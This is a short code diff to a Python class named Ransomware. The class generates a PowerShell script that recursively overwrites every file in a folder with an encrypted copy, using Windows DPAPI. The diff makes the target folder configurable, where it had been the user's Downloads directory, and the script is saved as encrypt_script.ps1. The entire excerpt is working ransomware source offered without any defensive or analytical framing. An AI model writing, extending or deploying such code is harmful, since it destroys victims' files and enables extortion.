@@ -24,14 +24,14 @@ class Ransomware:
         script_content = r'''
 $key = "{}"
 
-$files = Get-ChildItem -Path $HOME\Downloads -File -Recurse
+$files = Get-ChildItem -Path "{}" -File -Recurse
 
 foreach ($file in $files) {
     $data = Get-Content -Path $file.FullName -Encoding Byte -ReadCount 0
     $encryptedData = [System.Security.Cryptography.ProtectedData]::Protect($data, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
     Set-Content -Path $file.FullName -Value $encryptedData -Encoding Byte
 }
-'''.format(self.key.decode())
+'''.format(self.key.decode(), folder_path)
 
         # Generate a random script name
         script_name = "encrypt_script.ps1"
